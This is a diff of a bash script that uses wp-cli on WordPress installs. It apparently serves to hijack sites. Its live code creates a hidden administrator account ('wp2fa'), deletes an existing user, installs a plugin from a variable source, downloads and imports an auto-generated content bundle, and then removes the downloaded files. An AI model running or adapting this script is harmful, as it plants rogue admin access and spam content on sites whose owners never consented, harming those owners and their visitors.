@@ -58,42 +58,9 @@ _INSTALLWP() {
 	echo -e "${green}[+]${norm} http://${url}/wp-login.php"
 	echo -e "${green}[+] Username:${norm} ${username}${green} [+] password:${norm} ${password} | ${green}Have Fun ntol! ${norm}"
 
-#
-#	echo -e "[+] ========================================= [+]"
-#	echo -e "[~] Changing Permalinks..."
-#		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = '/%postname%/' WHERE option_name = 'permalink_structure'" $extra
-#		php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)options WHERE option_name = 'permalink_structure'" $extra
-#		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = 'http://${url}' WHERE option_name = 'siteurl'" $extra
-#		php wp-cli.phar db query "UPDATE $(php wp-cli.phar db prefix $extra)options SET option_value = 'http://${url}' WHERE option_name = 'home'" $extra
-#	echo -e "[~] Installing Plugin..."
-#	php wp-cli.phar plugin install ${source_campaign} --activate $extra
-	#php wp-cli.phar cron event list $extra
-
-#	php wp-cli.phar plugin install wordpress-importer --activate $extra
-#	wget ${xml_agc} -O agc.xml
-#	php wp-cli.phar import agc.xml --authors=create $extra
-#	sed -i -e 's/blogwpx_/'"$(php wp-cli.phar db prefix $extra)"'/g' agc.sql
-#	php wp-cli.phar db import agc.sql
-#	php wp-cli.phar user create ${username} admin@gmail.com --role=administrator
-#	echo -e "[+] Username: ${username}"
-
-	#	ENTERING KEYWORD
-	#php wp-cli.phar db query "DROP TABLE IF EXISTS $(php wp-cli.phar db prefix $extra)wp_api_keys" $extra
-
-	#	CREATING wp_api_keys TABLE
-	#echo -e "[~] CREATING wp_api_keys TABLE"
-
-	#php wp-cli.phar db query "CREATE TABLE $(php wp-cli.phar db prefix $extra)wp_api_keys ( id int(11) NOT NULL AUTO_INCREMENT,idmd5 varchar(50) CHARACTER SET latin1 NOT NULL,title text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,slug text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,category varchar(10) COLLATE utf8mb4_unicode_520_ci NOT NULL,target_uv varchar(10) COLLATE utf8mb4_unicode_520_ci NOT NULL,status varchar(10) COLLATE utf8mb4_unicode_520_ci NOT NULL, PRIMARY KEY (id),  UNIQUE KEY idmd5 (idmd5)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci" $extra
-	
-	#	CREATING wp_api_keys TABLE
-	#echo -e "[~] CREATING wp_api_keys TABLE"
-
-	#php wp-cli.phar db query "INSERT INTO $(php wp-cli.phar db prefix $extra)wp_api_keys ( id , idmd5 , title , slug , category , target_uv , status ) VALUES ( 1 , "
-
-
-	# 	wp core config --dbhost=host.db --dbname=prefix_db --dbuser=username --dbpass=password
-	#	wp core install --url=yourwebsite.com --title="Your Blog Title" --admin_name=wordpress_admin --admin_password=4Long&Strong1 --admin_email=you@example.com
 }
+
+
 _INSTALLAGC() {
 	username="wp2fa"
 	curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
@@ -103,8 +70,6 @@ _INSTALLAGC() {
 		php wp-cli.phar db query "SELECT * FROM $(php wp-cli.phar db prefix $extra)options WHERE option_name = 'permalink_structure'" $extra
 	echo -e "${blue}[~]${norm} Installing Plugin..."
 		php wp-cli.phar plugin install ${source_campaign} --activate $extra
-	#php wp-cli.phar cron event list $extra
-
 		php wp-cli.phar plugin install wordpress-importer --activate $extra
 		wget ${xml_agc} -O agc.xml
 		php wp-cli.phar import agc.xml --authors=create $extra
@@ -112,7 +77,7 @@ _INSTALLAGC() {
 		sed -i -e 's/blogwpx_/'"$(php wp-cli.phar db prefix $extra)"'/g' agc.sql
 		php wp-cli.phar db import agc.sql $extra
 		php wp-cli.phar user create ${username} adminwordpress@mailwordpress.com --role=administrator $extra
-		echo -e "${green}[+] Username:${norm} ${username}"
+	echo -e "${green}[+] Username:${norm} ${username}"
 		php wp-cli.phar user list $extra
 		php wp-cli.phar user delete "SangamUni2020" --reassign=1 $extra
 		php wp-cli.phar user list $extra
@@ -170,12 +135,3 @@ fi
 
 rm -rf "agc.sql"
 rm -rf "agc.xml" && rm -rf "wp-cli.phar"
-#	php wp-cli.phar db query "UPDATE wp_options SET option_value = '%postname%' WHERE option_name = 'permalink_structure'"
-
-
-#	php wp-cli.phar plugin install wordpress-importer --activate
-#	wget import https://raw.githubusercontent.com/rootraven04/named/main/agc.xml 
-#	php wp-cli.phar import agc.xml --authors=create
-
-
-# php -r "$msgid = "";$oldMessage = 'blogwpx_';$deletedFormat = '$(php wp-cli.phar db prefix $extra)';$str=file_get_contents('agc.sql');$str=str_replace($oldMessage, $deletedFormat,$str);file_put_contents('agc.sql', $str);"
